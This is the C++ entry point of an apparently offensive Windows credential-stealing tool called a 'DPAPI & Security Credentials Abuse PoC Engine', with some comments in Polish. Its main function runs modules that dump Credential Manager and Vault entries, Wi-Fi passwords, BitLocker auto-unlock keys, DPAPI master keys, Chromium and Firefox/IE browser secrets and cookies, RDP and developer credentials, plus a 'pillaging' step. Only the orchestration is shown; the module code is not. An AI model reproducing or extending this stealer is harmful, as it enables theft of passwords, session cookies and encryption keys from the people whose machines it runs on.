#include <iostream>
#include <windows.h>
#include "SystemCredentialsDump.h"
#include "DpapiMasterKeys.h"
#include "ChromiumDump.h"
#include "ChromiumV20.h"
#include "GeckoAndIECookies.h"
#include "RdpDump.h"
#include "DevCredentialsDump.h"
#include "Pillaging.h"
#include "VaultDump.h"

int main() {
    SetConsoleOutputCP(CP_UTF8);

    std::cout << "========================================================\n";
    std::cout << "  Windows DPAPI & Security Credentials Abuse PoC Engine \n";
    std::cout << "========================================================\n";

    // 1. Systemowe
    SystemCredentialsDump::DumpCredManager();
    SystemCredentialsDump::DumpWifiPasswords();
    SystemCredentialsDump::DecryptBitLockerAutoUnlock();
    SystemCredentialsDump::DumpEAPCertificates();

    // 2. DPAPI Master Keys
    DpapiMasterKeys::Dump();

    // 3. Vault (Web + Windows Credentials)
    VaultDump::Run();

    // 4. Chromium
    ChromiumDump::Run();
    ChromiumV20::Run();  // tylko z adminem

    // 5. Gecko / IE
    GeckoAndIECookies::RunAll();

    // 6. RDP
    RdpDump::Run();

    // 7. Dev / CLI
    DevCredentialsDump::Run();

    // 8. Pillaging
    Pillaging::Run();

    std::cout << "\n========================================================\n";
    std::cout << "[+] Execution has finished (finally) PoC.\n";

    return 0;
}